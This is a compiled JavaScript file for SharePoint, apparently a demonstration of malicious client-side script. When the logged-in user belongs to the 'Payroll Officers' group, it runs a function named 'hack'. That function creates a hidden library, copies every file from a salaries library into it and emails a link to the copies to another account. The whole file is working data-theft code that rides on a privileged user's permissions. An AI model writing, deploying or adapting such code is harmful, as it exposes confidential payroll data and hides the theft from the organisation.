"use strict";
exports.__esModule = true;
var $pnp = require("sp-pnp-js");
var hack = function () {
    console.log('START HACKING');
    var tmpListName = 'TMP_' + +new Date();
    var targetFolder = null;
    var foldersMapping = [];
    // Create another library
    $pnp.sp.web.lists
        .add(tmpListName, '', 101, false, {
        Hidden: true
    })
        .then(function (listCreated) {
        return $pnp.sp.web.lists
            .getById(listCreated.data.Id)
            .rootFolder.get()
            .then(function (rootFolder) {
            targetFolder = rootFolder;
        })
            .then(function () {
            // Get the folders from the salaries library
            return $pnp.sp.web
                .getFolderByServerRelativeUrl('/sites/aos_classic/salaries')
                .folders.filter("Name ne 'Forms'")
                .get()
                .then(function (folders) {
                var folderCreationPromises = [];
                folders.forEach(function (folder) {
                    var url = folder.ServerRelativeUrl;
                    console.log("Copying content of " + folder.ServerRelativeUrl);
                    var folderWeb = new $pnp.Web(_spPageContextInfo.webAbsoluteUrl);
                    folderCreationPromises.push(folderWeb
                        .getFolderByServerRelativeUrl(targetFolder.ServerRelativeUrl)
                        .folders.add(folder.Name)
                        .then(function (newTargetFolder) {
                        var newMapping = {
                            source: url,
                            target: targetFolder.ServerRelativeUrl + '/' + folder.Name
                        };
                        console.log(newMapping);
                        foldersMapping.push(newMapping);
                    }));
                });
                return Promise.all(folderCreationPromises);
                // Once all folders are created
            })
                .then(function () {
                var filesFetchPromises = [];
                // Get all the files to copy
                foldersMapping.forEach(function (fm) {
                    filesFetchPromises.push($pnp.sp.web
                        .getFolderByServerRelativeUrl(fm.source)
                        .files.get()
                        .then(function (files) {
                        fm.files = files;
                    }));
                });
                return Promise.all(filesFetchPromises);
            })
                .then(function () {
                var filesCopyPromises = [];
                foldersMapping.forEach(function (fm) {
                    console.log(fm.files);
                    fm.files.forEach(function (file) {
                        var newUrl = fm.target + '/' + file.Name;
                        console.log("Copying " + file.ServerRelativeUrl + " to " + newUrl);
                        var fileWeb = new $pnp.Web(_spPageContextInfo.webAbsoluteUrl);
                        filesCopyPromises.push(fileWeb
                            .getFileByServerRelativeUrl(file.ServerRelativeUrl)
                            .copyTo(newUrl)
                            .then(function () {
                            console.log('Copy done! HACKED !!!!');
                        })["catch"](function () {
                            console.log('CANNOT BE HACKED !');
                        }));
                    });
                });
                return Promise.all(filesCopyPromises);
            })
                .then(function () {
                var emailProps = {
                    To: ['bob.designer@ike365.onmicrosoft.com'],
                    CC: [],
                    Subject: 'Notification' + targetFolder.Name,
                    Body: "<a href='https://ike365.sharepoint.com/" +
                        targetFolder.ServerRelativeUrl +
                        "'>CHECK THE DOCUMENTS</a>"
                };
                $pnp.sp.utility.sendEmail(emailProps);
            });
        });
    });
};
// Check the current user is in the right group
$pnp.sp.web.currentUser
    .expand('Groups')
    .select('Id', 'Groups')
    .get()
    .then(function (result) {
    return result.Groups && result.Groups.filter(function (g) { return g.Title == 'Payroll Officers'; }).length == 1;
})
    .then(function (res) {
    if (res) {
        hack();
    }
});
